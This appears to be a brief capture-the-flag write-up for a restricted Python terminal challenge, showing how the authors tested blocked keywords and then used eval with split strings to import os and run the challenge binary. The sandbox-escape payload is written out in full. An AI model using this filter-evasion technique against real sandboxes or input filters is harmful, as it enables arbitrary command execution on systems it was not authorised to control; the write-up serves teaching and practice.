Python Escape from LA¶

Terminal Challenge¶

Our Solution¶

First we tried running os.system("./i_escaped") but found that Use of the command os.system is prohibited for this question We then tried to run import, exec, eval, and compile. The results were as follows:

>>> import
Use of the command import is prohibited for this question.
>>> exec
Use of the command exec is prohibited for this question.
>>> eval
<built-in function eval>
>>> compile
Use of the command compile is prohibited for this question.

Thus, we can use eval. We then tried to run eval('os.sys'+'tem("./i_escaped")') but got a NameError: name 'os' is not defined.

Thus, we used os=eval('__im'+'port__("os")) to import the os as a parameter (os)

Then, we used eval('os.sys'+'tem("./i_escaped")') to run ./i_escaped and solve the challenge.
